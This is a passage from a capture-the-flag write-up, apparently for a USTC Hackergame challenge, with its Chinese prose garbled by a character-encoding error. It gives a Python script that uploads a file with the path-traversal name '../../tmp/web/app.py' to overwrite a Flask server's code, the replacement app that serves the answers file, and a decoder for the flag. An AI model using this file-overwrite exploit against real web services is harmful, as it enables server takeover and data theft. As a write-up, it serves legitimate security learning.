</span></span><span class=line><span class=cl><span class=n>filepath</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>UPLOAD_DIR</span><span class=p>,</span> <span class=n>filename</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>filepath</span><span class=p>)</span>
</span></span></code></pre></div><p>è§£å†³æ–¹æ¡ˆå°±æ˜¯æŠŠä¸Šä¼ çš„æ–‡ä»¶åæ”¹æˆè½¯é“¾æ¥ï¼Œè¿™æ ·ä¸Šä¼ çš„æ–‡ä»¶ä¼šç›´æ¥è¦†ç›–æ‰<code>/tmp/web/app.py</code>ï¼Œä¸Šä¼ çš„æ–‡ä»¶å°±éšæ„äº›å†™ä¸€ä¸ªè¯»å–å¹¶è¿”å›<code>answer.json</code>çš„routeå³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_and_upload_file</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># # 1. åˆ›å»ºä¸€ä¸ªçœ‹ä¼¼æ­£å¸¸çš„JSONæ–‡ä»¶</span>
</span></span><span class=line><span class=cl>    <span class=c1># payload = [0] * 50000  # åˆ›å»º50000ä¸ª0çš„æ•°ç»„</span>
</span></span><span class=line><span class=cl>    <span class=c1># filename = &#34;payload.json&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># # å°†payloadå†™å…¥æ–‡ä»¶</span>
</span></span><span class=line><span class=cl>    <span class=c1># with open(filename, &#39;w&#39;) as f:</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     json.dump(payload, f)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;exp_ans.py&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2. ä¸Šä¼ æ–‡ä»¶</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;https://chal02-selrm3q9.hack-challenge.lug.ustc.edu.cn:8443/submit&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># è®¾ç½®ç‰¹æ®Šçš„æ–‡ä»¶åï¼Œå°è¯•åˆ›å»ºè½¯é“¾æ¥</span>
</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;file&#39;</span><span class=p>:</span> <span class=p>(</span><span class=s1>&#39;../../tmp/web/app.py&#39;</span><span class=p>,</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>),</span> <span class=s1>&#39;application/json&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># å‘é€è¯·æ±‚</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Status Code: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Response: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># # 3. æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>
</span></span><span class=line><span class=cl>    <span class=c1># os.remove(filename)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>create_and_upload_file</span><span class=p>()</span>
</span></span></code></pre></div><p>exp_ans.py:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;answers.json&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>answers</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;answers&#34;</span><span class=p>:</span> <span class=n>answers</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
</span></span></code></pre></div><p>è§£ç æ•°æ®ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>decode_flag</span><span class=p>(</span><span class=n>numbers</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># å°†æ¯ä¸ªæ•°å­—åŠ 65ç„¶åè½¬æ¢ä¸ºASCIIå­—ç¬¦</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>num</span> <span class=ow>in</span> <span class=n>numbers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>char</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>num</span> <span class=o>+</span> <span class=mi>65</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ä»å“åº”ä¸­è·å–çš„æ•°å­—</span>
</span></span><span class=line><span class=cl><span class=n>numbers</span> <span class=o>=</span> <span class=p>[</span><span class=mi>37</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>58</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=o>-</span><span class=mi>32</span><span class=p>,</span><span class=o>-</span><span class=mi>32</span><span class=p>,</span><span class=o>-</span><span class=mi>32</span><span class=p>,</span><span class=o>-</span><span class=mi>32</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>53</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>54</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>34</span><span class=p>,</span><span class=o>-</span><span class=mi>17</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>34</span><span class=p>,</span><span class=mi>37</span><span class=p>,</span><span class=o>-</span><span class=mi>8</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=o>-</span><span class=mi>9</span><span class=p>,</span><span class=mi>37</span><span class=p>,</span><span class=o>-</span><span class=mi>15</span><span class=p>,</span><span class=mi>37</span><span class=p>,</span><span class=mi>60</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>78</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>78</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>60</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>53</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>88</span><span class=p>,</span><span class=mi>70</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>41</span><span class=p>,</span><span class=mi>94</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>51</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>91</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>51</span><span class=p>,</span><span class=mi>27</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>41</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>85</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>98</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>70</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>81</span><span class=p>,</span><span class=mi>75</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>61</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>60</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>93</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>21</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>18</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>53</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>22</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>79</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>70</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>63</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>53</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>89</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>27</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>53</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>54</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>61</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>63</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>60</span><span class=p>,</span><span class=mi>22</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>98</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>70</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>82</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>58</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>93</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>67</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>86</span><span class=p>,</span><span class=mi>82</span><span class=p>,</span><span class=mi>54</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>67</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>75</span><span class=p>,</span><span class=mi>18</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>22</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>89</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>78</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>94</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>26</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>91</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>18</span><span class=p>,</span><span class=mi>22</span><span class=p>,</span><span class=mi>81</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>41</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>27</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>23</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>94</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>89</span><span class=p>,</span><span class=mi>88</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>95</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>34</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>63</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>54</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>71</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>97</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>79</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>94</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>70</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>64</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>82</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>34</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>95</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>69</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>22</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>59</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>92</span><span class=p>,</span><span class=mi>61</span><span class=p>,</span><span class=mi>73</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>78</span><span class=p>,</span><span class=mi>85</span><span class=p>,</span><span class=mi>66</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>41</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>34</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>23</span><span class=p>,</span><span class=mi>67</span><span class=p>,</span><span class=mi>81</span><span class=p>,</span><span class=mi>91</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>67</span><span class=p>,</span><span class=mi>67</span><span class=p>,</span><span class=mi>78</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>68</span><span class=p>,</span><span class=mi>95</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>63</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>82</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>62</span><span class=p>,</span><span class=mi>90</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>87</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>57</span><span class=p>,</span><span class=mi>23</span><span class=p>,</span><span class=mi>88</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>99</span><span class=p>,</span><span class=mi>74</span><span class=p>,</span><span class=mi>48</span><span class=p>,</span><span class=mi>83</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>65</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>76</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>79</span><span class=p>,</span><span class=mi>56</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>80</span><span class=p>,</span><span class=mi>70</span><span class=p>,</span><span class=mi>48</span><span class=p>,</span><span class=mi>48</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>93</span><span class=p>,</span><span class=mi>41</span><span class=p>,</span><span class=mi>55</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>84</span><span class=p>,</span><span class=mi>96</span><span class=p>,</span><span class=mi>77</span><span class=p>,</span><span class=mi>89</span><span class=p>,</span><span class=mi>87</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># è§£ç å¹¶æ‰“å°flag</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>decode_flag</span><span class=p>(</span><span class=n>numbers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Flag: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Flag: flag{uno!!!!_esrever_now_U_run_MY_c0dedcf9ba8f2f}LZ...</span>
